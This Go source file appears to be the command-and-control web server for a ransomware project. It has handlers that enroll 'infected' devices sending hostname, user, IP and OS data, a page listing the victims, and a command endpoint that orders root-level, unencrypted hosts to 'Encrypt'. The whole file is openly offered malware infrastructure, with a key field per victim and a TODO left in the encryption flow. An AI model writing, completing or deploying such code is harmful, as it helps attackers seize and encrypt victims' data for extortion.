package Webserver

import (
	"encoding/json"
	"fmt"
	"html/template"
	"io/ioutil"
	"log"
	"net/http"
)

var (
	device  Enumeration
	devices []Enumeration
)

type Enumeration struct {
	ID        string   `json:"ID"`
	Hostname  string   `json:"Hostname"`
	User      string   `json:"User"`
	IP        []string `json:"IP"`
	Pwd       string   `json:"Pwd"`
	OS        string   `json:"OS"`
	Encrypted bool
	Key       string
}

//used for querying that webserver is running
func HomeHandler(w http.ResponseWriter, r *http.Request) {
	defaultMessage := []byte("Listening for incoming connections ")
	_, err := w.Write(defaultMessage)
	if err != nil {
		log.Fatal(err)
	}
}

//listening for agents to enroll infected device (RegisterHost())
func InfectedHandler(w http.ResponseWriter, r *http.Request) {

	req, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Fatalf("Issue getting enumeration data from device: %s", err)
	}
	json.Unmarshal([]byte(req), &device)
	log.Printf("Enrolled a new device: %s", device.ID)
	device.Encrypted = false
	devices = append(devices, device)

}

//user page to view enrolled devices
func ViewInfected(w http.ResponseWriter, r *http.Request) {
	t, err := template.ParseFiles("./pages/infected.gohtml")
	if err != nil {
		log.Fatalf("Issue with 'infected' html template: %s", err.Error())
	}
	t.Execute(w, devices)
}

func CommandHandler(w http.ResponseWriter, r *http.Request) {
	//Reads the header of the request and issue commands
	//Tied to Agent.KeepAlive()

	fmt.Printf("Device %s requesting commands \n", device.ID)
	if device.User == "Root" && !device.Encrypted {
		w.WriteHeader(http.StatusOK)
		command := []byte("Encrypt")
		w.Write(command)
		//TODO: update device.Encrypted = true

	} else {
		command := []byte("Wait")
		w.Write(command)
	}
}
